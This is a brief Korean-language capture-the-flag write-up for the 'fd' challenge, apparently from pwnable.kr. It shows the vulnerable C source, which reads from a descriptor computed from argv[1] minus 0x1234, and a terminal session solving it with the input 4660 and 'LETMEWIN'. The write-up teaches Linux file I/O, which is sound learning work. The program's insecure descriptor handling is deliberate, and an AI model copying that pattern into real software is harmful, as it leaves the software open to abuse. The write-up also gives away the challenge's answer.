# fd
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
~~~
fd.c file이다. argv 값을 넘길 수 있는지 확인하는거다. argv로 넘어온 것을 정수화한 값에서 0x1234 값을 fd로 넘겨준다. 따라서 4660(0x1234)를 argv로 넘겨준 후 
LETMEWIN을 넘겨주면 된다.
~~~
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
~~~
